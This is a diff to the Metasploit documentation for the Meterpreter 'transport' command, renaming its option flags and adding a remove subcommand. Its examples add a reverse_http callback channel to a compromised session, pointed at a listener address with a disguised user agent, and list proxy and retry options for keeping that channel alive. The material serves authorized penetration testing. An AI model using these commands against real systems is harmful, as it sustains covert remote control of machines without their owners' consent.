@@ -18,7 +18,7 @@ The following output shows the current help text for the `transport` command:
 
 ```
 meterpreter > transport
-Usage: transport <list|change|add|next|prev> [options]
+Usage: transport <list|change|add|next|prev|remove> [options]
 
    list: list the currently active transports.
     add: add a new transport to the transport list.
@@ -29,24 +29,25 @@ Usage: transport <list|change|add|next|prev> [options]
 
 OPTIONS:
 
-    -c  <opt>  SSL certificate path for https transport verification (optional)
-    -ex <opt>  Expiration timeout (seconds) (default: same as current session)
-    -h         Help menu
-    -l  <opt>  LHOST parameter (for reverse transports)
-    -lu <opt>  Local URI for HTTP/S transports (used when adding/changing transports with a custom LURI)
-    -p  <opt>  LPORT parameter
-    -ph <opt>  Proxy host for http(s) transports (optional)
-    -pp <opt>  Proxy port for http(s) transports (optional)
-    -ps <opt>  Proxy password for http(s) transports (optional)
-    -pt <opt>  Proxy type for http(s) transports (optional: http, socks; default: http)
-    -pu <opt>  Proxy username for http(s) transports (optional)
-    -rt <opt>  Retry total time (seconds) (default: same as current session)
-    -rw <opt>  Retry wait time (seconds) (default: same as current session)
-    -t  <opt>  Transport type: reverse_tcp, reverse_http, reverse_https, bind_tcp
-    -to <opt>  Comms timeout (seconds) (default: same as current session)
-    -u  <opt>  Custom URI for HTTP/S transports (used when removing transports)
-    -ua <opt>  User agent for http(s) transports (optional)
-    -v         Show the verbose format of the transport list
+    -A <opt>  User agent for HTTP/S transports (optional)
+    -B <opt>  Proxy type for HTTP/S transports (optional: http, socks; default: http)
+    -C <opt>  Comms timeout (seconds) (default: same as current session)
+    -H <opt>  Proxy host for HTTP/S transports (optional)
+    -N <opt>  Proxy password for HTTP/S transports (optional)
+    -P <opt>  Proxy port for HTTP/S transports (optional)
+    -T <opt>  Retry total time (seconds) (default: same as current session)
+    -U <opt>  Proxy username for HTTP/S transports (optional)
+    -W <opt>  Retry wait time (seconds) (default: same as current session)
+    -X <opt>  Expiration timout (seconds) (default: same as current session)
+    -c <opt>  SSL certificate path for https transport verification (optional)
+    -h        Help menu
+    -i <opt>  Specify transport by index (currently supported: remove)
+    -l <opt>  LHOST parameter (for reverse transports)
+    -p <opt>  LPORT parameter
+    -t <opt>  Transport type: reverse_tcp, reverse_http, reverse_https, bind_tcp
+    -u <opt>  Local URI for HTTP/S transports (used when adding/changing transports with a custom LURI)
+    -v        Show the verbose format of the transport list
+
 
 ```
 
@@ -90,7 +91,7 @@ Adding transports is the hot new thing. It gives Meterpreter the ability to work
 The following command shows a simple example that adds a `reverse_http` transport to an existing Meterpreter session. It specifies a custom communications timeout, retry total and retry wait, and also specifies a custom user-agent string to be used for the HTTP requests:
 
 ```
-meterpreter > transport add -t reverse_http -l 10.1.10.40 -p 5105 -rt 50000 -rw 2500 -to 100000 -ua "Totes-Legit Browser/1.1"
+meterpreter > transport add -t reverse_http -l 10.1.10.40 -p 5105 -T 50000 -W 2500 -C 100000 -A "Totes-Legit Browser/1.1"
 [*] Adding new transport ...
 [+] Successfully added reverse_http transport.
 ```
@@ -100,20 +101,20 @@ This command is what was used to create the transport that was listed in the sam
 * The `-t` option is what tells Metasploit what type of transport to add. The options are `bind_tcp`, `reverse_tcp`, `reverse_http` and `reverse_https`. These match those that are used for the construction of the original payloads. Given that we are not dealing with stages, there is no `reverse_winhttps` because Meterpreter always uses the WinHTTP API behind the scenes anyway.
 * The `-l` option specifies what we all know as the `LHOST` parameter.
 * The `-p` option specifies what we all know as the `LPORT` parameter.
-* The `-rt` option matches the `retry total` parameter. The measure of this value is in seconds, and should be a positive integer that is more than `-rw`.
-* The `-rw` option matches the `retry wait` parameter. The measure of this value is in seconds, and should be a positive integer that is less than `-rt`.
-* The `-to` option matches the `communication timeout`. The measure of this value is in seconds, and should be a positive integer.
-* The `-ua` specifies a custom user agent that is used for HTTP requests.
+* The `-T` option matches the `retry total` parameter. The measure of this value is in seconds, and should be a positive integer that is more than `-W`.
+* The `-W` option matches the `retry wait` parameter. The measure of this value is in seconds, and should be a positive integer that is less than `-T`.
+* The `-C` option matches the `communication timeout`. The measure of this value is in seconds, and should be a positive integer.
+* The `-A` specifies a custom user agent that is used for HTTP requests.
 
 It is also possible to specify the following:
 
-* The `-lu` option allows the addition of a local URI (`LURI`) value that is prepended to the UUID URI that is used for all requests. This URI value helps segregate listeners and payloads based on a URI.
-* The `-ph` option specifies a proxy host/IP. This parameter is optional.
-* The `-pt` option specifies a proxy type, and needs to be set to `http` or `socks`. If not specified alongside the `-ph` parameter, the default type is `http`.
-* The `-pp` option specifies the port that the proxy is listening on. This should be set when `-ph` is set.
-* The `-pu` option specifies the username to use to authenticate with the proxy. This parameter is optional.
-* The `-ps` option specifies the password to use to authenticate with the proxy. This parameter is optional.
-* The `-ex` option specifies the overall Meterpreter session timeout value. While this value is not transport-specific, the option is provided here so that it can be set alongside the other transport-specific timeout values for ease of use.
+* The `-u` option allows the addition of a local URI (`LURI`) value that is prepended to the UUID URI that is used for all requests. This URI value helps segregate listeners and payloads based on a URI.
+* The `-H` option specifies a proxy host/IP. This parameter is optional.
+* The `-B` option specifies a proxy type, and needs to be set to `http` or `socks`. If not specified alongside the `-H` parameter, the default type is `http`.
+* The `-P` option specifies the port that the proxy is listening on. This should be set when `-H` is set.
+* The `-U` option specifies the username to use to authenticate with the proxy. This parameter is optional.
+* The `-N` option specifies the password to use to authenticate with the proxy. This parameter is optional.
+* The `-X` option specifies the overall Meterpreter session timeout value. While this value is not transport-specific, the option is provided here so that it can be set alongside the other transport-specific timeout values for ease of use.
 * Finally the `-c` parameter can be used to indicate the expected SSL certificate. This parameter expects a file path to an SSL certificate in `PEM` format. The SHA1 hash of the certificate is extracted from the file, and this is used during the request validation process. If this file doesn't exist, or doesn't contain a valid certificate, then the request should fail.
 
 The following shows another example which adds another `reverse_tcp` transport to the transport list:
@@ -343,7 +344,7 @@ The following Meterpreter implementations currently support the transport comman
  * POSIX x86
  * Android
  * Java
- * ~~Python~~ Coming [very soon](https://github.com/rapid7/metasploit-framework/pull/5654)
+ * Python
 
   [Timeout documentation]: https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Timeout-Control
   [Reliable Network documentation]: https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Reliable-Network-Communication
